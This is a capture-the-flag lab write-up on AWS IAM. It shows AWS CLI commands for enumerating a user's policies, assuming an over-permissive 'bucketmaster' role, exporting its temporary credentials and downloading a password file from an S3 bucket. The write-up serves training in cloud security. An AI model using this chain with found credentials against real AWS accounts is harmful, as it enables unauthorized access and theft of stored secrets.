# AWS Security - S3cret Santa

## Objective
Use discovered AWS credentials to enumerate IAM permissions, assume a role, and access S3 data.

## Key Concepts
- **AWS CLI** uses credentials from `~/.aws/credentials`
- **STS (Security Token Service)** allows identity inspection and role assumption
- **IAM** controls access via Users, Groups, Roles, and Policies
- **S3** is AWS object storage using buckets and objects

## Initial Enumeration
### Verify Credentials
```bash
aws sts get-caller-identity
```
Confirms active user: `sir.carrotbane`

### List IAM Users
```bash
aws iam list-users
```

## IAM Policy Enumeration
### Inline User Policies
```bash
aws iam list-user-policies --user-name sir.carrotbane
aws iam get-user-policy --user-name sir.carrotbane --policy-name POLICYNAME
```

**Key Permission Found**
- `sts:AssumeRole`
- Various IAM *List/Get* actions

### Group Membership
```bash
aws iam list-groups-for-user --user-name sir.carrotbane
```
(No groups)

## Role Enumeration
### List Roles
```bash
aws iam list-roles
```
Interesting role found: **bucketmaster**

### Role Policies
```bash
aws iam list-role-policies --role-name bucketmaster
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

**bucketmaster Permissions**
- `s3:ListAllMyBuckets`
- `s3:ListBucket` on specific buckets
- `s3:GetObject` on `easter-secrets-123145/*`

## Privilege Escalation: Assume Role
```bash
aws sts assume-role   --role-arn arn:aws:iam::123456789012:role/bucketmaster   --role-session-name TBFC
```

### Export Temporary Credentials
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

### Confirm Role
```bash
aws sts get-caller-identity
```

## S3 Enumeration & Data Exfiltration
### List Buckets
```bash
aws s3api list-buckets
```

### List Objects
```bash
aws s3api list-objects --bucket easter-secrets-123145
```

### Download Sensitive File
```bash
aws s3api get-object   --bucket easter-secrets-123145   --key cloud_password.txt   cloud_password.txt
```

## Outcome
- Successfully assumed a higher-privileged role
- Accessed and exfiltrated sensitive S3 data
- Demonstrates risk of over-permissive IAM roles
